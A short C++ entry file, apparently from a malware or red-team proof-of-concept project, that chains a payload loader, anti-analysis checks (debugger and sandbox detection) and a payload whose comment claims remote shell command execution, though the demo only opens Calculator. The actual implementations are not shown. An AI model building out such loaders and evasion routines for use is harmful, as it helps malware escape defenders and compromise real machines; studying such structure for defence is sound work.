#include "main.h"
#include <iostream>

int main() {
    // Initialize the loader to decrypt and load the payload
    ABCloader loader;
    std::cout << "[*] Running ABCloader..." << std::endl;
    loader.runLoader();

    // Start anti-analysis techniques (PEB detection, sandbox checks, etc.)
    AntiAnalysis antiAnalysis;
    std::cout << "[*] Running anti-analysis techniques..." << std::endl;
    antiAnalysis.runAntiAnalysis();

    // Initialize the payload (ABCsync) to execute remote shell commands and modify files
    ABCsync syncPayload;
    std::cout << "[*] Executing ABCsync payload (open Calculator)..." << std::endl;
    syncPayload.executePayload();  // Opens Calculator

    std::cout << "[*] Completed execution." << std::endl;
    return 0;
}
